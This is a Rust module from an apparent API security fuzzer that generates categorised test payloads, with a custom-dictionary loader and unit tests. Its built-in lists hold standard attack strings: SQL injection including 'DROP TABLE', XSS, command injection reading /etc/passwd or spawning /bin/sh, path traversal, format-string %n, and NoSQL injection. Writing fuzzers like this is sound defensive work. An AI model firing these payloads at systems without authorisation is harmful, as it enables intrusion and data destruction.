//! Fuzzing payload generators
//!
//! Generates various mutation payloads for security testing.

use serde_json::Value as JsonValue;

use std::fs;
use std::io::{BufRead, BufReader};
use std::path::Path;

/// Category of fuzz payload
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum PayloadCategory {
    /// SQL injection patterns
    SqlInjection,
    /// Cross-site scripting patterns
    Xss,
    /// Command injection patterns
    CommandInjection,
    /// Path traversal patterns
    PathTraversal,
    /// Boundary testing (long strings, special chars)
    Boundary,
    /// Type confusion (null, NaN, wrong types)
    TypeConfusion,
    /// Format string attacks
    FormatString,
    /// Integer overflow/underflow
    IntegerOverflow,
    /// Unicode and encoding attacks
    Unicode,
    /// NoSQL injection patterns
    NoSqlInjection,
    /// Custom user-defined payloads
    Custom,
}

impl PayloadCategory {
    pub fn as_str(&self) -> &'static str {
        match self {
            PayloadCategory::SqlInjection => "SQL Injection",
            PayloadCategory::Xss => "XSS",
            PayloadCategory::CommandInjection => "Command Injection",
            PayloadCategory::PathTraversal => "Path Traversal",
            PayloadCategory::Boundary => "Boundary",
            PayloadCategory::TypeConfusion => "Type Confusion",
            PayloadCategory::FormatString => "Format String",
            PayloadCategory::IntegerOverflow => "Integer Overflow",
            PayloadCategory::Unicode => "Unicode",
            PayloadCategory::NoSqlInjection => "NoSQL Injection",
            PayloadCategory::Custom => "Custom",
        }
    }

    /// Get all categories
    pub fn all() -> Vec<PayloadCategory> {
        vec![
            PayloadCategory::SqlInjection,
            PayloadCategory::Xss,
            PayloadCategory::CommandInjection,
            PayloadCategory::PathTraversal,
            PayloadCategory::Boundary,
            PayloadCategory::TypeConfusion,
            PayloadCategory::FormatString,
            PayloadCategory::IntegerOverflow,
            PayloadCategory::Unicode,
            PayloadCategory::NoSqlInjection,
        ]
    }
}

/// A fuzzing payload with metadata
#[derive(Debug, Clone)]
pub struct FuzzPayload {
    /// The payload value
    pub value: JsonValue,
    /// Category of the payload
    pub category: PayloadCategory,
    /// Human-readable description
    pub description: String,
    /// Risk level (1-5, 5 being most dangerous)
    pub risk_level: u8,
}

impl FuzzPayload {
    pub fn new(value: impl Into<JsonValue>, category: PayloadCategory, description: &str, risk_level: u8) -> Self {
        Self {
            value: value.into(),
            category,
            description: description.to_string(),
            risk_level,
        }
    }

    pub fn string(s: &str, category: PayloadCategory, description: &str, risk_level: u8) -> Self {
        Self::new(JsonValue::String(s.to_string()), category, description, risk_level)
    }
}

/// Generate all fuzzing payloads for a given field
pub fn generate_payloads(categories: Option<&[PayloadCategory]>) -> Vec<FuzzPayload> {
    let cats = categories.map(|c| c.to_vec()).unwrap_or_else(PayloadCategory::all);
    let mut payloads = Vec::new();

    for category in cats {
        match category {
            PayloadCategory::SqlInjection => payloads.extend(sql_injection_payloads()),
            PayloadCategory::Xss => payloads.extend(xss_payloads()),
            PayloadCategory::CommandInjection => payloads.extend(command_injection_payloads()),
            PayloadCategory::PathTraversal => payloads.extend(path_traversal_payloads()),
            PayloadCategory::Boundary => payloads.extend(boundary_payloads()),
            PayloadCategory::TypeConfusion => payloads.extend(type_confusion_payloads()),
            PayloadCategory::FormatString => payloads.extend(format_string_payloads()),
            PayloadCategory::IntegerOverflow => payloads.extend(integer_overflow_payloads()),
            PayloadCategory::Unicode => payloads.extend(unicode_payloads()),
            PayloadCategory::NoSqlInjection => payloads.extend(nosql_injection_payloads()),
            PayloadCategory::Custom => {} // Custom payloads are added separately via generate_payloads_with_custom
        }
    }

    payloads
}

fn sql_injection_payloads() -> Vec<FuzzPayload> {
    vec![
        FuzzPayload::string("'", PayloadCategory::SqlInjection, "Single quote", 3),
        FuzzPayload::string("\"", PayloadCategory::SqlInjection, "Double quote", 3),
        FuzzPayload::string("' OR '1'='1", PayloadCategory::SqlInjection, "Classic OR injection", 4),
        FuzzPayload::string("' OR 1=1--", PayloadCategory::SqlInjection, "OR with comment", 4),
        FuzzPayload::string("'; DROP TABLE users;--", PayloadCategory::SqlInjection, "DROP TABLE", 5),
        FuzzPayload::string("1; SELECT * FROM users", PayloadCategory::SqlInjection, "Stacked query", 4),
        FuzzPayload::string("' UNION SELECT NULL--", PayloadCategory::SqlInjection, "UNION injection", 4),
        FuzzPayload::string("admin'--", PayloadCategory::SqlInjection, "Comment bypass", 3),
        FuzzPayload::string("1' AND '1'='1", PayloadCategory::SqlInjection, "Boolean-based blind", 3),
        FuzzPayload::string("1' AND SLEEP(5)--", PayloadCategory::SqlInjection, "Time-based blind", 3),
        FuzzPayload::string("'; WAITFOR DELAY '0:0:5'--", PayloadCategory::SqlInjection, "MSSQL time delay", 3),
        FuzzPayload::string("1 OR 1=1", PayloadCategory::SqlInjection, "Numeric OR injection", 3),
    ]
}

fn xss_payloads() -> Vec<FuzzPayload> {
    vec![
        FuzzPayload::string("<script>alert(1)</script>", PayloadCategory::Xss, "Basic script tag", 4),
        FuzzPayload::string("<img src=x onerror=alert(1)>", PayloadCategory::Xss, "IMG onerror", 4),
        FuzzPayload::string("<svg onload=alert(1)>", PayloadCategory::Xss, "SVG onload", 4),
        FuzzPayload::string("javascript:alert(1)", PayloadCategory::Xss, "JavaScript protocol", 3),
        FuzzPayload::string("<body onload=alert(1)>", PayloadCategory::Xss, "Body onload", 4),
        FuzzPayload::string("'\"><script>alert(1)</script>", PayloadCategory::Xss, "Quote escape + script", 4),
        FuzzPayload::string("<iframe src=\"javascript:alert(1)\">", PayloadCategory::Xss, "Iframe injection", 4),
        FuzzPayload::string("{{constructor.constructor('alert(1)')()}}", PayloadCategory::Xss, "Template injection", 4),
        FuzzPayload::string("${alert(1)}", PayloadCategory::Xss, "Template literal", 3),
        FuzzPayload::string("<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>", PayloadCategory::Xss, "Nested tags bypass", 4),
    ]
}

fn command_injection_payloads() -> Vec<FuzzPayload> {
    vec![
        FuzzPayload::string("; ls -la", PayloadCategory::CommandInjection, "Semicolon command", 5),
        FuzzPayload::string("| cat /etc/passwd", PayloadCategory::CommandInjection, "Pipe command", 5),
        FuzzPayload::string("$(whoami)", PayloadCategory::CommandInjection, "Command substitution", 5),
        FuzzPayload::string("`id`", PayloadCategory::CommandInjection, "Backtick execution", 5),
        FuzzPayload::string("& ping -c 1 127.0.0.1", PayloadCategory::CommandInjection, "Background command", 4),
        FuzzPayload::string("|| echo vulnerable", PayloadCategory::CommandInjection, "OR command", 4),
        FuzzPayload::string("&& echo vulnerable", PayloadCategory::CommandInjection, "AND command", 4),
        FuzzPayload::string("\n/bin/sh", PayloadCategory::CommandInjection, "Newline injection", 5),
        FuzzPayload::string("%0aid", PayloadCategory::CommandInjection, "URL-encoded newline", 4),
        FuzzPayload::string("{{7*7}}", PayloadCategory::CommandInjection, "SSTI basic", 4),
    ]
}

fn path_traversal_payloads() -> Vec<FuzzPayload> {
    vec![
        FuzzPayload::string("../../../etc/passwd", PayloadCategory::PathTraversal, "Basic traversal", 5),
        FuzzPayload::string("....//....//....//etc/passwd", PayloadCategory::PathTraversal, "Double-dot bypass", 5),
        FuzzPayload::string("..%2f..%2f..%2fetc/passwd", PayloadCategory::PathTraversal, "URL-encoded traversal", 4),
        FuzzPayload::string("..%252f..%252f..%252fetc/passwd", PayloadCategory::PathTraversal, "Double URL-encoded", 4),
        FuzzPayload::string("/etc/passwd", PayloadCategory::PathTraversal, "Absolute path", 4),
        FuzzPayload::string("file:///etc/passwd", PayloadCategory::PathTraversal, "File protocol", 4),
        FuzzPayload::string("....\\....\\....\\windows\\win.ini", PayloadCategory::PathTraversal, "Windows traversal", 4),
        FuzzPayload::string("%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd", PayloadCategory::PathTraversal, "Unicode traversal", 4),
    ]
}

fn boundary_payloads() -> Vec<FuzzPayload> {
    vec![
        FuzzPayload::string("", PayloadCategory::Boundary, "Empty string", 2),
        FuzzPayload::string(" ", PayloadCategory::Boundary, "Single space", 2),
        FuzzPayload::string("    ", PayloadCategory::Boundary, "Multiple spaces", 2),
        FuzzPayload::string(&"A".repeat(1000), PayloadCategory::Boundary, "Long string (1000)", 3),
        FuzzPayload::string(&"A".repeat(10000), PayloadCategory::Boundary, "Very long string (10000)", 4),
        FuzzPayload::string(&"A".repeat(100000), PayloadCategory::Boundary, "Huge string (100000)", 5),
        FuzzPayload::string("\0", PayloadCategory::Boundary, "Null byte", 4),
        FuzzPayload::string("\0\0\0", PayloadCategory::Boundary, "Multiple null bytes", 4),
        FuzzPayload::string("\t\n\r", PayloadCategory::Boundary, "Whitespace chars", 2),
        FuzzPayload::string("test\0hidden", PayloadCategory::Boundary, "Null byte injection", 4),
        FuzzPayload::string("\r\n\r\n", PayloadCategory::Boundary, "CRLF injection", 4),
        FuzzPayload::string(&"🔥".repeat(1000), PayloadCategory::Boundary, "Many emojis", 3),
    ]
}

fn type_confusion_payloads() -> Vec<FuzzPayload> {
    vec![
        FuzzPayload::new(JsonValue::Null, PayloadCategory::TypeConfusion, "Null value", 3),
        FuzzPayload::new(JsonValue::Bool(true), PayloadCategory::TypeConfusion, "Boolean true", 2),
        FuzzPayload::new(JsonValue::Bool(false), PayloadCategory::TypeConfusion, "Boolean false", 2),
        FuzzPayload::new(serde_json::json!(0), PayloadCategory::TypeConfusion, "Zero", 2),
        FuzzPayload::new(serde_json::json!(-1), PayloadCategory::TypeConfusion, "Negative one", 2),
        FuzzPayload::new(serde_json::json!(1.1), PayloadCategory::TypeConfusion, "Float", 2),
        FuzzPayload::new(serde_json::json!([]), PayloadCategory::TypeConfusion, "Empty array", 2),
        FuzzPayload::new(serde_json::json!({}), PayloadCategory::TypeConfusion, "Empty object", 2),
        FuzzPayload::new(serde_json::json!(["nested"]), PayloadCategory::TypeConfusion, "Array instead of string", 3),
        FuzzPayload::new(serde_json::json!({"key": "value"}), PayloadCategory::TypeConfusion, "Object instead of string", 3),
        FuzzPayload::string("NaN", PayloadCategory::TypeConfusion, "NaN string", 3),
        FuzzPayload::string("Infinity", PayloadCategory::TypeConfusion, "Infinity string", 3),
        FuzzPayload::string("-Infinity", PayloadCategory::TypeConfusion, "Negative Infinity", 3),
        FuzzPayload::string("undefined", PayloadCategory::TypeConfusion, "Undefined string", 3),
        FuzzPayload::string("null", PayloadCategory::TypeConfusion, "Null string", 2),
        FuzzPayload::string("true", PayloadCategory::TypeConfusion, "True string", 2),
        FuzzPayload::string("false", PayloadCategory::TypeConfusion, "False string", 2),
    ]
}

fn format_string_payloads() -> Vec<FuzzPayload> {
    vec![
        FuzzPayload::string("%s%s%s%s%s", PayloadCategory::FormatString, "Multiple %s", 4),
        FuzzPayload::string("%n%n%n%n%n", PayloadCategory::FormatString, "Multiple %n (write)", 5),
        FuzzPayload::string("%x%x%x%x", PayloadCategory::FormatString, "Hex format", 3),
        FuzzPayload::string("%d%d%d%d", PayloadCategory::FormatString, "Integer format", 3),
        FuzzPayload::string("%.10000s", PayloadCategory::FormatString, "Width specifier", 4),
        FuzzPayload::string("%p%p%p%p", PayloadCategory::FormatString, "Pointer format", 4),
        FuzzPayload::string("{0}{1}{2}", PayloadCategory::FormatString, "Python format", 3),
        FuzzPayload::string("%(key)s", PayloadCategory::FormatString, "Python named format", 3),
    ]
}

fn integer_overflow_payloads() -> Vec<FuzzPayload> {
    vec![
        FuzzPayload::new(serde_json::json!(2147483647), PayloadCategory::IntegerOverflow, "INT32_MAX", 3),
        FuzzPayload::new(serde_json::json!(2147483648_i64), PayloadCategory::IntegerOverflow, "INT32_MAX + 1", 4),
        FuzzPayload::new(serde_json::json!(-2147483648_i64), PayloadCategory::IntegerOverflow, "INT32_MIN", 3),
        FuzzPayload::new(serde_json::json!(-2147483649_i64), PayloadCategory::IntegerOverflow, "INT32_MIN - 1", 4),
        FuzzPayload::new(serde_json::json!(9223372036854775807_i64), PayloadCategory::IntegerOverflow, "INT64_MAX", 3),
        FuzzPayload::string("9223372036854775808", PayloadCategory::IntegerOverflow, "INT64_MAX + 1 string", 4),
        FuzzPayload::new(serde_json::json!(4294967295_u64), PayloadCategory::IntegerOverflow, "UINT32_MAX", 3),
        FuzzPayload::new(serde_json::json!(4294967296_u64), PayloadCategory::IntegerOverflow, "UINT32_MAX + 1", 4),
        FuzzPayload::string("99999999999999999999999999999999", PayloadCategory::IntegerOverflow, "Very large number", 4),
        FuzzPayload::string("-99999999999999999999999999999999", PayloadCategory::IntegerOverflow, "Very large negative", 4),
        FuzzPayload::new(serde_json::json!(0.0000000001), PayloadCategory::IntegerOverflow, "Very small float", 2),
        FuzzPayload::new(serde_json::json!(1e308), PayloadCategory::IntegerOverflow, "Max double", 3),
    ]
}

fn unicode_payloads() -> Vec<FuzzPayload> {
    vec![
        FuzzPayload::string("\u{202E}reversed\u{202C}", PayloadCategory::Unicode, "Right-to-left override", 4),
        FuzzPayload::string("\u{0000}", PayloadCategory::Unicode, "Unicode null", 4),
        FuzzPayload::string("\u{FEFF}", PayloadCategory::Unicode, "BOM character", 3),
        FuzzPayload::string("\u{200B}", PayloadCategory::Unicode, "Zero-width space", 3),
        FuzzPayload::string("\u{00A0}", PayloadCategory::Unicode, "Non-breaking space", 2),
        FuzzPayload::string("Ａｄｍｉｎ", PayloadCategory::Unicode, "Fullwidth chars", 3),
        FuzzPayload::string("admin\u{0000}hidden", PayloadCategory::Unicode, "Unicode null injection", 4),
        FuzzPayload::string("\u{FF1C}script\u{FF1E}", PayloadCategory::Unicode, "Fullwidth angle brackets", 3),
        FuzzPayload::string("ⓐⓓⓜⓘⓝ", PayloadCategory::Unicode, "Circled letters", 3),
        FuzzPayload::string("＜script＞", PayloadCategory::Unicode, "Fullwidth tags", 3),
        FuzzPayload::string("\u{FE64}script\u{FE65}", PayloadCategory::Unicode, "Small form tags", 3),
        FuzzPayload::string("аdmin", PayloadCategory::Unicode, "Cyrillic lookalike", 4),
    ]
}

fn nosql_injection_payloads() -> Vec<FuzzPayload> {
    vec![
        FuzzPayload::string("{\"$gt\": \"\"}", PayloadCategory::NoSqlInjection, "MongoDB $gt", 4),
        FuzzPayload::string("{\"$ne\": null}", PayloadCategory::NoSqlInjection, "MongoDB $ne", 4),
        FuzzPayload::string("{\"$regex\": \".*\"}", PayloadCategory::NoSqlInjection, "MongoDB $regex", 4),
        FuzzPayload::string("{\"$where\": \"1==1\"}", PayloadCategory::NoSqlInjection, "MongoDB $where", 5),
        FuzzPayload::new(serde_json::json!({"$gt": ""}), PayloadCategory::NoSqlInjection, "MongoDB $gt object", 4),
        FuzzPayload::new(serde_json::json!({"$ne": null}), PayloadCategory::NoSqlInjection, "MongoDB $ne object", 4),
        FuzzPayload::string("true, $or: [ {}, { 'a': 'a", PayloadCategory::NoSqlInjection, "MongoDB OR injection", 4),
        FuzzPayload::string("'; return true; var foo='", PayloadCategory::NoSqlInjection, "JavaScript injection", 5),
    ]
}

/// Load custom payloads from a dictionary file (one payload per line)
pub fn load_custom_payloads_from_file(path: &Path) -> Result<Vec<FuzzPayload>, String> {
    let file = fs::File::open(path)
        .map_err(|e| format!("Failed to open fuzz dictionary file '{}': {}", path.display(), e))?;

    let reader = BufReader::new(file);
    let mut payloads = Vec::new();

    for (line_num, line_result) in reader.lines().enumerate() {
        let line = line_result
            .map_err(|e| format!("Failed to read line {} in fuzz dictionary: {}", line_num + 1, e))?;

        // Skip empty lines and comments
        let trimmed = line.trim();
        if trimmed.is_empty() || trimmed.starts_with('#') {
            continue;
        }

        // Parse optional metadata: "payload|description|risk_level"
        // Or just the payload string itself
        let (payload_str, description, risk_level) = if trimmed.contains('|') {
            let parts: Vec<&str> = trimmed.splitn(3, '|').collect();
            let payload = parts[0].to_string();
            let desc = parts.get(1).map(|s| s.to_string()).unwrap_or_else(|| format!("Custom payload #{}", line_num + 1));
            let risk: u8 = parts.get(2)
                .and_then(|s| s.trim().parse().ok())
                .unwrap_or(3);
            (payload, desc, risk.min(5).max(1))
        } else {
            (trimmed.to_string(), format!("Custom payload #{}", line_num + 1), 3)
        };

        // Try to parse as JSON, fall back to string
        let value = match serde_json::from_str::<JsonValue>(&payload_str) {
            Ok(v) => v,
            Err(_) => JsonValue::String(payload_str),
        };

        payloads.push(FuzzPayload {
            value,
            category: PayloadCategory::Custom,
            description,
            risk_level,
        });
    }

    Ok(payloads)
}

/// Create custom payloads from CLI-provided strings
pub fn create_custom_payloads(payloads: &[String]) -> Vec<FuzzPayload> {
    payloads.iter().enumerate().map(|(i, payload_str)| {
        // Try to parse as JSON, fall back to string
        let value = match serde_json::from_str::<JsonValue>(payload_str) {
            Ok(v) => v,
            Err(_) => JsonValue::String(payload_str.clone()),
        };

        FuzzPayload {
            value,
            category: PayloadCategory::Custom,
            description: format!("CLI payload #{}", i + 1),
            risk_level: 3,
        }
    }).collect()
}

/// Generate payloads including custom ones
pub fn generate_payloads_with_custom(
    categories: Option<&[PayloadCategory]>,
    custom_payloads: Vec<FuzzPayload>,
) -> Vec<FuzzPayload> {
    let mut payloads = generate_payloads(categories);
    payloads.extend(custom_payloads);
    payloads
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_generate_all_payloads() {
        let payloads = generate_payloads(None);
        assert!(!payloads.is_empty());
        assert!(payloads.len() > 50); // Should have many payloads
    }

    #[test]
    fn test_generate_single_category() {
        let payloads = generate_payloads(Some(&[PayloadCategory::SqlInjection]));
        assert!(!payloads.is_empty());
        for p in &payloads {
            assert_eq!(p.category, PayloadCategory::SqlInjection);
        }
    }

    #[test]
    fn test_payload_categories() {
        let cats = PayloadCategory::all();
        assert_eq!(cats.len(), 10);
    }
}
